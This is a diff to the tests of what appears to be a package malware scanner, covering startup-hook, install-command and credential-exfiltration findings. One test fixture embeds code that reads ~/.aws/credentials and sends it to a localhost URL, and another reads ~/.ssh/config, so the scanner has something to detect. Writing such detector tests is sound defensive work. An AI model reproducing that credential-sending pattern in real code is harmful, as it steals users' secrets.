@@ -7,7 +7,7 @@ def ids(fs):
 
 
 def test_benign_package_has_no_findings(toy_package):
-    assert pc.scan(toy_package) == []
+    assert [f for f in pc.scan(toy_package) if f.severity != "info"] == []
     assert pc.extract(toy_package) == {}
 
 
@@ -33,9 +33,11 @@ def test_version_diff_only_raises_new_capabilities(tmp_path):
     new = make_malicious_package(tmp_path / "new")
     fs = pc.scan(new, previous=old)
     assert "PKG.HOOK.STARTUP_HOOK" in ids(fs)
-    assert all("newly added" in f.title for f in fs)
-    # identical versions raise nothing new
-    assert ids(pc.scan(new, previous=new)) == {"PKG.CAP.NO_NEW"}
+    assert any(f.id == "PKG.HOOK.STARTUP_HOOK" and "new in this release" in f.title and f.severity == "critical" for f in fs)
+    # the same release compared with itself: every hook was already there, so nothing is above info
+    same = pc.scan(new, previous=new)
+    assert not [f for f in same if f.severity != "info" and f.id.startswith(("PKG.HOOK", "PKG.NEW"))]
+    assert all(f.severity == "info" for f in same if f.id.startswith("PKG.HOOK"))
 
 
 def test_diff_capabilities():
@@ -73,12 +75,12 @@ def test_credential_read_plus_network_is_exfil(tmp_path):
     d = _pkg(tmp_path, **{"p/core.py": "import pathlib, urllib.request\nk = (pathlib.Path.home() / '.aws' / 'credentials').read_text()\n"
                                        "urllib.request.urlopen('http://127.0.0.1:9/?' + k)\n"})
     fs = _ids(pc.scan(d))
-    assert fs["PKG.CODE.CREDENTIAL_EXFIL"].severity == "critical" and fs["PKG.CAP.ENV_SECRETS"].severity == "high"
+    assert fs["PKG.COMBO.CREDENTIAL_EXFIL"].severity == "critical" and fs["PKG.SIGNAL.ENV_SECRETS"].severity == "info"
 
 
 def test_reading_credentials_without_sending_is_not_exfil(tmp_path):
     d = _pkg(tmp_path, **{"p/core.py": "import pathlib\nk = (pathlib.Path.home() / '.ssh' / 'config').read_text()\n"})
-    assert "PKG.CODE.CREDENTIAL_EXFIL" not in _ids(pc.scan(d))
+    assert "PKG.COMBO.CREDENTIAL_EXFIL" not in _ids(pc.scan(d))
 
 
 def test_custom_install_command_is_flagged_and_an_inert_one_is_not(tmp_path):
